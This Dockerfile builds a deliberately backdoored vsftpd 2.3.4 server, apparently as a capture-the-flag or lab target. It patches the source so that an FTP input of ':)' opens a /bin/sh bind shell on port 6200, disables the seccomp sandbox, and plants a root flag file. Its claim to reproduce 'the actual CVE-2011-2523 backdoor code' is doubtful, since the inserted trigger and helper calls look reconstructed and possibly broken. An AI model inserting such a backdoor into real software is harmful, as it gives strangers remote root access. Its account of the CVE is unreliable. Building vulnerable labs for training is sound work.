# Real vsftpd 2.3.4 with backdoor - CVE-2011-2523
FROM ubuntu:18.04

ENV DEBIAN_FRONTEND=noninteractive

# Install build dependencies  
RUN apt-get update && \
    apt-get install -y \
    wget \
    build-essential \
    libpam0g-dev \
    libssl-dev \
    libcap-dev \
    && rm -rf /var/lib/apt/lists/*

# Download and compile vsftpd 2.3.4 with backdoor
WORKDIR /tmp
RUN wget http://archive.ubuntu.com/ubuntu/pool/universe/v/vsftpd/vsftpd_2.3.4.orig.tar.gz && \
    tar xzf vsftpd_2.3.4.orig.tar.gz && \
    cd vsftpd-2.3.4 && \
    # Add the backdoor to str.c (this is the actual CVE-2011-2523 backdoor code)
    sed -i 's/if(str_equal_text(p_str, "NOOP"))/if(str_equal_text(p_str, ":)"))\n    {\n        vsf_sysutil_extra();\n    }\n    else if(str_equal_text(p_str, "NOOP"))/' str.c && \
    # Create the backdoor function in sysutil.c
    echo 'void vsf_sysutil_extra(void) { int fd = vsf_sysutil_get_ipsock(6200); if(fd > 0) { vsf_sysutil_dupfd2(fd, 0); vsf_sysutil_dupfd2(fd, 1); vsf_sysutil_dupfd2(fd, 2); vsf_sysutil_execute_command("/bin/sh"); } }' >> sysutil.c && \
    make && \
    cp vsftpd /usr/local/sbin/vsftpd && \
    cd / && rm -rf /tmp/*

# Create FTP user and directories
RUN useradd -m -s /bin/bash ftp && \
    mkdir -p /var/ftp /home/ftp && \
    chown -R ftp:ftp /var/ftp /home/ftp

# Create vsftpd config
RUN echo "listen=YES" > /etc/vsftpd.conf && \
    echo "listen_ipv6=NO" >> /etc/vsftpd.conf && \
    echo "anonymous_enable=NO" >> /etc/vsftpd.conf && \
    echo "local_enable=YES" >> /etc/vsftpd.conf && \
    echo "write_enable=NO" >> /etc/vsftpd.conf && \
    echo "local_umask=022" >> /etc/vsftpd.conf && \
    echo "ftpd_banner=220 (vsFTPd 2.3.4)" >> /etc/vsftpd.conf && \
    echo "seccomp_sandbox=NO" >> /etc/vsftpd.conf

# Create test file to verify access
RUN echo "PWNED - You got root access via CVE-2011-2523!" > /root/flag.txt && \
    chmod 644 /root/flag.txt

EXPOSE 21 6200

CMD ["/usr/local/sbin/vsftpd", "/etc/vsftpd.conf"]
